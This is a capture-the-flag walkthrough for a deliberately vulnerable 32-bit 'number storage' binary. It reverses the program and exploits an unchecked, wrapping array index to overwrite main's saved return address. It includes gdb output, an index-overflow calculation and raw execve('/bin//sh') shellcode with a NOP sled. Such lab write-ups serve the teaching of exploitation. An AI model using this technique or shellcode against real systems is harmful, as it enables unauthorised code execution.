# Walkthrough

## Reversing

```c
int main(int argc,char **argv,char **envp)
{
  char cVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  int *piVar5;
  char *pcVar6;
  byte *pbVar7;
  int in_GS_OFFSET;
  bool bVar8;
  bool bVar9;
  bool bVar10;
  byte bVar11;
  char **envp_ptr;
  char **argv_ptr;
  int storage [100];
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  int local_14;

  bVar11 = 0;
  argv_ptr = argv;
  envp_ptr = envp;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  local_2c = 0;
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  local_1c = 0;
  local_18 = 0;
  piVar5 = storage;
  for (iVar2 = 100; iVar2 != 0; iVar2 = iVar2 + -1) {
    *piVar5 = 0;
    piVar5 = piVar5 + 1;
  }
  for (; *argv_ptr != (char *)0x0; argv_ptr = argv_ptr + 1) {
    uVar3 = 0xffffffff;
    pcVar6 = *argv_ptr;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + (uint)bVar11 * -2 + 1;
    } while (cVar1 != '\0');
    memset(*argv_ptr,0,~uVar3 - 1);
  }
  for (; *envp_ptr != (char *)0x0; envp_ptr = envp_ptr + 1) {
    uVar3 = 0xffffffff;
    pcVar6 = *envp_ptr;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + (uint)bVar11 * -2 + 1;
    } while (cVar1 != '\0');
    memset(*envp_ptr,0,~uVar3 - 1);
  }
  puts(
      "----------------------------------------------------\n  Welcome to wil\'s crappy number stora ge service!   \n----------------------------------------------------\n Commands:                                           \n    store - store a number into the data storage    \n    read   - read a number from the data storage     \n    quit  - exit the program                         \n----------------------------------------------------\n   wil has reserved some storage :>                  \n----------------------------------------------------\n"
      );
  do {
    printf("Input command: ");
    local_2c = 1;
    fgets((char *)&local_28,20,stdin);
    uVar3 = 0xffffffff;
    puVar4 = &local_28;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *(char *)puVar4;
      puVar4 = (undefined4 *)((int)puVar4 + (uint)bVar11 * -2 + 1);
    } while (cVar1 != '\0');
    uVar3 = ~uVar3;
    bVar8 = uVar3 == 1;
    bVar10 = uVar3 == 2;
    *(undefined *)((int)&local_2c + uVar3 + 2) = 0;
    iVar2 = 5;
    puVar4 = &local_28;
    pbVar7 = (byte *)"store";
    do {
      if (iVar2 == 0) break;
      iVar2 = iVar2 + -1;
      bVar8 = *(byte *)puVar4 < *pbVar7;
      bVar10 = *(byte *)puVar4 == *pbVar7;
      puVar4 = (undefined4 *)((int)puVar4 + (uint)bVar11 * -2 + 1);
      pbVar7 = pbVar7 + (uint)bVar11 * -2 + 1;
    } while (bVar10);
    bVar9 = false;
    bVar8 = (!bVar8 && !bVar10) == bVar8;
    if (bVar8) {
      local_2c = store_number((int)storage);
    }
    else {
      iVar2 = 4;
      puVar4 = &local_28;
      pbVar7 = &DAT_08048d61;
      do {
        if (iVar2 == 0) break;
        iVar2 = iVar2 + -1;
        bVar9 = *(byte *)puVar4 < *pbVar7;
        bVar8 = *(byte *)puVar4 == *pbVar7;
        puVar4 = (undefined4 *)((int)puVar4 + (uint)bVar11 * -2 + 1);
        pbVar7 = pbVar7 + (uint)bVar11 * -2 + 1;
      } while (bVar8);
      bVar10 = false;
      bVar8 = (!bVar9 && !bVar8) == bVar9;
      if (bVar8) {
        local_2c = read_number((int)storage);
      }
      else {
        iVar2 = 4;
        puVar4 = &local_28;
        pbVar7 = &DAT_08048d66;
        do {
          if (iVar2 == 0) break;
          iVar2 = iVar2 + -1;
          bVar10 = *(byte *)puVar4 < *pbVar7;
          bVar8 = *(byte *)puVar4 == *pbVar7;
          puVar4 = (undefined4 *)((int)puVar4 + (uint)bVar11 * -2 + 1);
          pbVar7 = pbVar7 + (uint)bVar11 * -2 + 1;
        } while (bVar8);
        if ((!bVar10 && !bVar8) == bVar10) {
          if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
            return 0;
          }
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
      }
    }
    if (local_2c == 0) {
      printf(" Completed %s command successfully\n",&local_28);
    }
    else {
      printf(" Failed to do %s command\n",&local_28);
    }
    local_28 = 0;
    local_24 = 0;
    local_20 = 0;
    local_1c = 0;
    local_18 = 0;
  } while( true );
}
```

This program is larger than the usual ones, I don't like it because I need
to code the source, and I spend more time coding the source than in the actual
explotation.

What we see here is a pretty simple binary, although large, that asks for an
input command, there are three commands:
- `store`: store a nunmber in the specified index,
- `read`: reads the number in the specified index.
- `quit`: self explanatory.

The store and read functions:j
```c
undefined4 get_unum(void)
{
  undefined4 local_10 [3];

  local_10[0] = 0;
  fflush(stdout);
  scanf("%u",local_10);
  clear_stdin();
  return local_10[0];
}

undefined4 read_number(int param_1)
{
  int iVar1;

  printf(" Index: ");
  iVar1 = get_unum();
  printf(" Number at data[%u] is %u\n",iVar1,*(undefined4 *)(iVar1 * 4 + param_1));
  return 0;
}

undefined4 store_number(int param_1)
{
  uint uVar1;
  uint uVar2;
  undefined4 uVar3;

  printf(" Number: ");
  uVar1 = get_unum();
  printf(" Index: ");
  uVar2 = get_unum();
  if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    uVar3 = 1;
  }
  else {
    *(uint *)(uVar2 * 4 + param_1) = uVar1;
    uVar3 = 0;
  }
  return uVar3;
}
```

The `read_number` function doesn't have any type of protection, so we can
read any index we want, in other words, we can read an
arbitrary memory location.

The `store_number` function is more of the same, but it has a check, we can't
write in any address multiple of 3.

## Explotation

Easy, let's just rewrite the EIP address, let's search for it first.

Launch `./resources/exploit.sh`, it's a script that will print every
index from `1` to `200`.

It's important to notice that we are trying to find the `EIP` of `main`,
the entry point of the binary is often a function named `_start` in the libc
library, which sets up the environment and then calls main. So the `EIP` of
`main` will return to that function, so it's not in the binary itself and
the address will not look like the usual `EIP`s.

But it's easy to find, just place a BP at `main`, and print the regs:
```bash
gdb -q ./level07

b *main
r
info frame

# Output
Stack level 0, frame at 0xffffd6f0:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd6f0
 Saved registers:
  eip at 0xffffd6ec
```

As you can see, the saved `EIP` is `0xf7e45513`, let's search for that address
on the `exploit.sh` output:
```raw
109: 8048a09
110: f7fceff4
111: 0
112: 0
113: 0
114: f7e45513 <-- Here !
115: 1
116: ffffd794
117: ffffd79c
118: f7fd3000
119: 0
120: ffffd71c
```

And there it is, at index `114`, cool.

So, we just need to overwrite that index with the address of our shellcode, but
there's a little issue:
```bash
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 33731
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command:
```

So... yeah, remember the __only__ condition we had? The index can't be a
multiple of `3`, and `114` is, so that's why...

But don't worry, check again the line that writes the value:
```c
printf(" Number at data[%u] is %u\n",iVar1,*(undefined4 *)(iVar1 * 4 + param_1));
```

Indeed, it multiplies our input by `4`, so, as we did in `rainfall`, we can
overflow that, to make it turn around, let's make a little program to test
different values.

Let's get the max value for a `unsigned int` in `x86`:
```bash
bc

2^32
4294967296
```

And launch `./resources/getindex.c` to play a little with it:
```bash
gcc getindex.c -o getindex
./getindex 4
```

So, if we need the index `114`, that internally gets multiplied by `4`, we
can just use `4294967296 / 4 + 114`, because the first division result, when
multiplied by `4`, will result in the `max uint`, that's it, `0`, so we
can access the same index but with a different number, that will pass the
`n % 3 == 0` condition:
```bash
bc

4294967296 / 4 + 114
1073741938
```

Test it in the `getindex` binary (`max uint / 4 + 114`):
```bash
./getindex
Index we need: 114
1073741938
Index: 114
```

Cool! The only issue now is that we have a `memset` that is erasing the
environment... So we will need to store our shellcode to the `storage` as
well.

So, take the usual [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html),
and `4` bytes at a time, convert it to unsigned integers, I made a `C` program
to achieve this in `./resources/sc2uint.c`.
```bash
gcc -m32 sc2uint.c -o sc2uint
./sc2uint $(python -c "print '\x90'*100+'\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
# ...
```

Cool, now let's make a script that converts our shellcode to `unsigned int`s,
executes `./level07`, and automatically stores our shellcode and overwrites
`EIP` with the direction of our shellcode.

The only problem is that we don't know the address of the `storage[100]` buffer,
that's the one will contain our shellcode, let's get it.

We know that the `storage[100]` is on:
```raw
int[100]          Stack[-0x1bc   storage                                 XREF[3]:     08048791(*), 
                                                                                      080488e3(*), 
                                                                                      08048924(*)  
```

So let's put a BP in `main` and print that location:
```bash
gdb -q ./level07
b *main
r
p $esp-0x1bc

# Output
$2 = (void *) 0xffffd530
```

We could also put our BP on the `read_number` call, as the buffer address gets
passed as parameter:
```bash
gdb -q ./level07
b *main+520
r

# Input
read

# Output, BP reached!
Breakpoint 3, 0x0804892b in main ()
(gdb) p/x $eax
$9 = 0xffffd524
```

As you see, the buffer address varies, that's because `gdb` adds stuff to the
stack, but that's why we add `NOP`s to our shellcode!

So, let's get the address `0xffffd530`, and since we have `100` bytes of `NOP`s
in the SC, let's add `50` to that address, so we have `50` bytes of margin.

```bash
# This will print the result in decimal directly
# So we can pass the result directly to the `store` command
echo "ibase=16;FFFFD530+50" | bc
4294956416
```

Easy, let's add the `store` command that will overwrite main return address to
the script, and run it.
